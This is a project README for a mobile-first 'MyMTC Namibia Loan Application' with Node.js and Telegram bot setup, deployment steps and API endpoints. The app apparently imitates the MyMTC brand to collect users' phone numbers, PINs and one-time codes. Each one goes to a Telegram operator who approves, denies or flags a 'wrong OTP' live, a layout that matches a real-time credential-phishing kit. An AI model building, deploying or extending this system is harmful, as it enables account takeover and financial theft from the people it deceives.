# MyMTC Namibia Loan Application

A complete loan application platform for Namibia with real-time Telegram bot integration for approval workflows, OTP verification via SMS, and a beautiful mobile-first UI using MyMTC branding colors.

## Features

✅ **Beautiful Mobile UI** - Responsive, modern design with MyMTC branding
✅ **Loan Application** - Apply for loans up to N$500,000
✅ **Phone Verification** - Namibian phone number validation
✅ **Login Verification** - Phone & PIN-based authentication
✅ **OTP System** - Generate and verify OTP codes
✅ **Telegram Bot Integration** - Real-time approval workflow
✅ **Instant Callbacks** - Immediate status updates via polling
✅ **Admin Dashboard** - Telegram bot controls for approvals/denials

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                   Frontend (Static Site)                 │
│          - index.html, styles.css, app.js               │
│          - Hosted on Netlify/Vercel/GitHub Pages        │
└────────────────┬────────────────────────────────────────┘
                 │ HTTP/HTTPS API Calls
                 ▼
┌─────────────────────────────────────────────────────────┐
│            Backend (Node.js + Express)                   │
│        - server.js (API endpoints)                       │
│        - bot.js (Telegram integration)                   │
│        - Hosted on Railway/Render/Heroku                │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
            Telegram API
           (Bot Notifications)
```

## Project Structure

```
mymtc-loan-app/
├── frontend/
│   ├── index.html          # Main HTML structure
│   ├── styles.css          # MyMTC-branded styles
│   └── app.js              # Frontend logic & API calls
├── backend/
│   ├── server.js           # Express API server
│   └── bot.js              # Telegram bot handler
├── package.json            # Dependencies
├── .env.example            # Environment variables template
└── README.md              # This file
```

## Installation

### Prerequisites

- Node.js 16+ and npm
- Telegram account (for bot)
- Git

### Step 1: Clone Repository

```bash
git clone https://github.com/boyokip4-create/mymtc-loan-app.git
cd mymtc-loan-app
```

### Step 2: Install Dependencies

```bash
npm install
```

### Step 3: Set Up Environment Variables

Copy `.env.example` to `.env` and fill in your credentials:

```bash
cp .env.example .env
```

Edit `.env`:

```env
# Telegram Bot
TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
TELEGRAM_ADMIN_ID=your_admin_chat_id

# Server
PORT=3000
FRONTEND_URL=http://localhost:8000
NODE_ENV=development
```

## Getting Your Credentials

### Telegram Bot Token

1. Open Telegram and search for **@BotFather**
2. Send `/start` then `/newbot`
3. Follow the prompts to create your bot
4. Copy the bot token (example: `1234567890:ABCDefGHIJKLmnoPQRStuvWXYZ`)
5. Also note your Chat ID for admin notifications

To get your Chat ID:
1. Message your bot with `/start`
2. Go to `https://api.telegram.org/bot{YOUR_BOT_TOKEN}/getUpdates`
3. Look for `"id"` in the response - that's your Chat ID

## Running the Application

### Development Mode

**Terminal 1 - Backend Server:**
```bash
npm start
```
Server runs on `http://localhost:3000`

**Terminal 2 - Telegram Bot:**
```bash
node backend/bot.js
```

**Terminal 3 - Frontend (any static server):**
```bash
cd frontend
npx http-server -p 8000
# or
python -m http.server 8000
# or use Live Server in VS Code
```

Access frontend at `http://localhost:8000`

## Deployment

### Deploy Frontend (Static Site)

#### Option 1: Netlify

```bash
# Install Netlify CLI
npm install -g netlify-cli

# Deploy
netlify deploy --dir=frontend
```

#### Option 2: Vercel

```bash
# Install Vercel CLI
npm install -g vercel

# Deploy
cd frontend
vercel
```

#### Option 3: GitHub Pages

1. Push to GitHub
2. Go to Settings → Pages
3. Select `main` branch, `/frontend` folder
4. Enable GitHub Pages

### Deploy Backend (Node.js)

#### Option 1: Railway

```bash
# Install Railway CLI
npm install -g @railway/cli

# Login and deploy
railway login
railway link
railway up
```

#### Option 2: Render

1. Push code to GitHub
2. Go to [render.com](https://render.com)
3. Create new Web Service
4. Connect your GitHub repo
5. Set environment variables
6. Deploy

#### Option 3: Heroku

```bash
# Install Heroku CLI
npm install -g heroku

# Login and deploy
heroku login
heroku create mymtc-loan-app
heroku config:set $(cat .env)
git push heroku main
```

## API Endpoints

### 1. Submit Loan Application
```http
POST /api/loan/apply
Content-Type: application/json

{
  "fullName": "John Doe",
  "phoneNumber": "+264812345678",
  "loanAmount": 100000,
  "loanPurpose": "business"
}

Response:
{
  "sessionId": "SESSION_abc123...",
  "message": "Application submitted successfully"
}
```

### 2. Submit Login Verification
```http
POST /api/loan/verify-login
Content-Type: application/json

{
  "sessionId": "SESSION_abc123...",
  "phoneNumber": "+264812345678",
  "pin": "1234"
}

Response:
{
  "sessionId": "SESSION_abc123...",
  "message": "Login submitted. OTP sent to your phone."
}
```

### 3. Verify OTP
```http
POST /api/loan/verify-otp
Content-Type: application/json

{
  "sessionId": "SESSION_abc123...",
  "otp": "123456"
}

Response:
{
  "sessionId": "SESSION_abc123...",
  "message": "OTP submitted for verification"
}
```

### 4. Resend OTP
```http
POST /api/loan/resend-otp
Content-Type: application/json

{
  "sessionId": "SESSION_abc123...",
  "phoneNumber": "+264812345678"
}
```

### 5. Check Approval Status
```http
POST /api/loan/check-status
Content-Type: application/json

{
  "sessionId": "SESSION_abc123...",
  "stage": "login"
}

Response:
{
  "status": "approved|denied|pending|wrong_otp",
  "stage": "current_stage",
  "reason": "denial reason if denied"
}
```

### 6. Telegram Bot Callback (Internal)
```http
POST /api/telegram-callback
Content-Type: application/json

{
  "sessionId": "SESSION_abc123...",
  "action": "approve_login|deny_login|verify_device|approve_otp|wrong_otp",
  "reason": "optional denial reason"
}
```

## User Flow

```
1. Apply for Loan
   ↓
2. Enter Details (Name, Phone, Amount, Purpose)
   → Application sent to Telegram bot
   → Admin approves/denies in Telegram
   ↓
3. Login (Phone & PIN)
   → OTP generated and displayed to user (or sent via SMS provider of choice)
   → Admin reviews in Telegram
   → Admin clicks APPROVE/DENY/VERIFY DEVICE
   ↓
4. OTP Verification
   → User enters 6-digit OTP
   → Admin reviews in Telegram
   → Admin clicks APPROVE/WRONG OTP
   ↓
5. Status Page
   → Success: "Congratulations! Your loan has been submitted for review"
   → Error: "Application Denied"
```

## Telegram Bot Commands

Once the bot is running, send these commands:

- `/start` - Welcome message
- `/help` - Show commands
- `/status` - Check pending approvals count
- `/clear` - Clear pending requests

## Environment Variables Reference

| Variable | Description | Example |
|----------|-------------|---------|
| TELEGRAM_BOT_TOKEN | Your Telegram bot token | `1234567890:ABCDefGHI` |
| TELEGRAM_ADMIN_ID | Your Telegram chat ID | `123456789` |
| PORT | Backend server port | `3000` |
| NODE_ENV | Environment | `development` or `production` |
| FRONTEND_URL | Frontend URL for CORS | `http://localhost:8000` |
| API_BASE_URL | Backend API URL | `http://localhost:3000/api` |

## Customizing OTP Delivery

By default, OTP codes are generated but not automatically sent. You can integrate with any SMS provider:

### Option 1: Integrate your own SMS provider
Edit `backend/server.js` and replace the `sendOTP` function with your SMS API call.

### Option 2: Display OTP to admin via Telegram
The bot can send the OTP code to the admin for manual verification.

### Option 3: Use a different SMS provider
- **Africa's Talking** - Popular in Africa
- **SMPP Gateway** - Local Namibian providers
- **Vonage/Nexmo** - Global SMS service
- **AWS SNS** - Enterprise solution

## Troubleshooting

### OTP not verifying
- Check that OTP hasn't expired (2 minute window)
- Verify exact OTP match (6 digits)
- Check backend logs for errors

### Telegram bot not receiving messages
- Verify `TELEGRAM_BOT_TOKEN` is correct
- Check `TELEGRAM_ADMIN_ID` is your actual chat ID
- Ensure bot is running: `node backend/bot.js`
- Test bot with `/start` command

### CORS errors
- Update `FRONTEND_URL` in `.env` to match your frontend domain
- For local development, use `http://localhost:8000`

### API requests failing
- Ensure backend is running on correct port
- Check `API_BASE_URL` in frontend `app.js`
- Verify backend URL is accessible from frontend

## Color Scheme (MyMTC Branding)

| Color | Hex | Usage |
|-------|-----|-------|
| Primary Red | `#e30613` | Buttons, headers, accents |
| Dark Red | `#c9000b` | Button hover, links |
| Black | `#171717` | Text, dark elements |
| Dark Gray | `#252525` | Secondary text |
| Gray | `#6b6b6b` | Placeholder text, muted |
| Light Gray | `#f5f5f5` | Backgrounds |
| White | `#ffffff` | Cards, surfaces |
| Success Green | `#20a464` | Success messages |
| Warning Orange | `#f4a000` | Warnings |

## Security Notes

⚠️ **Important Security Recommendations:**

1. **Never commit `.env` file** - It contains secrets
2. **Use environment variables** on production servers
3. **Enable HTTPS** on production frontend
4. **Validate all inputs** server-side
5. **Rate limit API endpoints** to prevent abuse
6. **Store sessions securely** (use database in production)
7. **Implement 2FA** for admin Telegram bot
8. **Log all transactions** for audit trail
9. **PCI Compliance** - Don't store payment info
10. **Data Privacy** - Comply with Namibia's data protection laws

## Production Deployment Checklist

- [ ] Update `NODE_ENV=production` in `.env`
- [ ] Use database (MongoDB) instead of in-memory storage
- [ ] Enable HTTPS on frontend and backend
- [ ] Set up proper logging and monitoring
- [ ] Configure rate limiting
- [ ] Set up automated backups
- [ ] Enable CORS for your actual domain
- [ ] Test all workflows end-to-end
- [ ] Set up error tracking (Sentry)
- [ ] Configure CDN for frontend assets
- [ ] Implement your OTP delivery method
- [ ] Test full workflow with real data

## Support & Documentation

- [Telegraf.js Docs](https://telegraf.js.org/)
- [Express.js Docs](https://expressjs.com/)
- [MyMTC Namibia](https://mymtc.com.na/)

## License

ISC

## Author

boyokip4-create

---

**Built with ❤️ for Namibia**
